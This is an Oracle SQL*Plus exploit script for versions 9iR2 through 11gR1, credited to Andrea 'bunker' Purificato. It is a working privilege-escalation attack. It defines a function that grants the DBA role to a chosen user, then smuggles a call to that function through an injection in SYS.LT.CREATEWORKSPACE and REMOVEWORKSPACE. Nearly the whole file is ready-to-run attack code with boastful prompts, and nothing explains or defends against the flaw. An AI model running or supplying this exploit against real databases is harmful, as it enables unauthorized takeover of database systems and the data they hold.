-- 
-- sys-lt-removeworkspace.sql
--
--
-- Oracle SYS.LT.REMOVEWORKSPACE exploit (9iR2/10gR1,10gR2,11gR1)
--
-- Grant dba permission to unprivileged user
-- 
-- 
--   REF:    http://www.google.it/search?q=SYS.LT.REMOVEWORKSPACE
--   
--   AUTHOR: Andrea "bunker" Purificato
--           http://rawlab.mindcreations.com
--
--
set serveroutput on;
prompt [+] sys-lt-removeworkspace.sql exploit
prompt [+] by Andrea "bunker" Purificato - http://rawlab.mindcreations.com
prompt [+] 37F1 A7A1 BB94 89DB A920  3105 9F74 7349 AF4C BFA2
prompt 
undefine the_user;
accept the_user char prompt 'Target username (default TEST): ' default 'TEST';
prompt
prompt [-] Building evil function...

CREATE OR REPLACE FUNCTION OWN RETURN NUMBER 
 AUTHID CURRENT_USER AS 
 PRAGMA AUTONOMOUS_TRANSACTION; 
BEGIN
 EXECUTE IMMEDIATE 'GRANT DBA TO &the_user'; COMMIT; 
 RETURN(0);
END;
/

prompt [-] Finishing...

EXEC SYS.LT.CREATEWORKSPACE('x''||'||user||'.own||''--'); 
EXEC SYS.LT.REMOVEWORKSPACE('x''||'||user||'.own||''--');

prompt [-] YOU GOT THE POWAH!!
